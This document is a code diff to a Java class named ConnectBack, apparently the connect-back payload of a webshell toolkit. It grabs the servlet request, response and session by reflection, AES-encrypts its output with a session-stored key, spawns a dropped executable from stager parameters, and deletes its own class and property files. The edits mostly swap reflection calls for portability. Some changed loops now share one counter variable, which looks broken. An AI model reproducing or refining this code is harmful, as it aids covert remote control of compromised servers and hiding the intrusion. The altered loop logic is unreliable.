@@ -83,11 +83,11 @@ public class ConnectBack extends ClassLoader implements Runnable {
          } finally {
             if (var13) {
                try {
-                  so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
-                  write = so.getClass().getDeclaredMethod("write", byte[].class);
+                  so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
+                  write = so.getClass().getMethod("write", byte[].class);
                   write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-                  so.getClass().getDeclaredMethod("flush").invoke(so);
-                  so.getClass().getDeclaredMethod("close").invoke(so);
+                  so.getClass().getMethod("flush").invoke(so);
+                  so.getClass().getMethod("close").invoke(so);
                } catch (Exception var14) {
                }
 
@@ -95,11 +95,11 @@ public class ConnectBack extends ClassLoader implements Runnable {
          }
 
          try {
-            so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
-            write = so.getClass().getDeclaredMethod("write", byte[].class);
+            so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
+            write = so.getClass().getMethod("write", byte[].class);
             write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-            so.getClass().getDeclaredMethod("flush").invoke(so);
-            so.getClass().getDeclaredMethod("close").invoke(so);
+            so.getClass().getMethod("flush").invoke(so);
+            so.getClass().getMethod("close").invoke(so);
          } catch (Exception var15) {
          }
 
@@ -107,11 +107,11 @@ public class ConnectBack extends ClassLoader implements Runnable {
       }
 
       try {
-         so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
-         write = so.getClass().getDeclaredMethod("write", byte[].class);
+         so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
+         write = so.getClass().getMethod("write", byte[].class);
          write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-         so.getClass().getDeclaredMethod("flush").invoke(so);
-         so.getClass().getDeclaredMethod("close").invoke(so);
+         so.getClass().getMethod("flush").invoke(so);
+         so.getClass().getMethod("close").invoke(so);
       } catch (Exception var16) {
       }
 
@@ -198,6 +198,7 @@ public class ConnectBack extends ClassLoader implements Runnable {
 
       int spawn = Integer.parseInt(props.getProperty("Spawn", "0"));
       String droppedExecutable = props.getProperty("DroppedExecutable");
+      int i;
       if (spawn > 0) {
          props.setProperty("Spawn", String.valueOf(spawn - 1));
          droppedFile = File.createTempFile("~spawn", ".tmp");
@@ -224,7 +225,7 @@ public class ConnectBack extends ClassLoader implements Runnable {
          Thread.sleep(2000L);
          File[] files = new File[]{classFile, classFile.getParentFile(), propFile, tempDir};
 
-         for(int i = 0; i < files.length; ++i) {
+         for(i = 0; i < files.length; ++i) {
             for(i = 0; i < 10 && !files[i].delete(); ++i) {
                files[i].deleteOnExit();
                Thread.sleep(100L);
@@ -293,7 +294,7 @@ public class ConnectBack extends ClassLoader implements Runnable {
          StringTokenizer stageParamTokenizer = new StringTokenizer("Payload -- " + props.getProperty("StageParameters", ""), " ");
          String[] stageParams = new String[stageParamTokenizer.countTokens()];
 
-         for(int i = 0; i < stageParams.length; ++i) {
+         for(i = 0; i < stageParams.length; ++i) {
             stageParams[i] = stageParamTokenizer.nextToken();
          }
 
@@ -481,7 +482,7 @@ public class ConnectBack extends ClassLoader implements Runnable {
    }
 
    private byte[] Encrypt(byte[] bs) throws Exception {
-      String key = this.Session.getClass().getDeclaredMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
+      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
       byte[] raw = key.getBytes("utf-8");
       SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
       Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
@@ -492,9 +493,9 @@ public class ConnectBack extends ClassLoader implements Runnable {
 
    private void fillContext(Object obj) throws Exception {
       if (obj.getClass().getName().indexOf("PageContext") >= 0) {
-         this.Request = obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
-         this.Response = obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
-         this.Session = obj.getClass().getDeclaredMethod("getSession").invoke(obj);
+         this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
+         this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
+         this.Session = obj.getClass().getMethod("getSession").invoke(obj);
       } else {
          Map objMap = (Map)obj;
          this.Session = objMap.get("session");
@@ -502,7 +503,7 @@ public class ConnectBack extends ClassLoader implements Runnable {
          this.Request = objMap.get("request");
       }
 
-      this.Response.getClass().getDeclaredMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
+      this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }
 
    static {
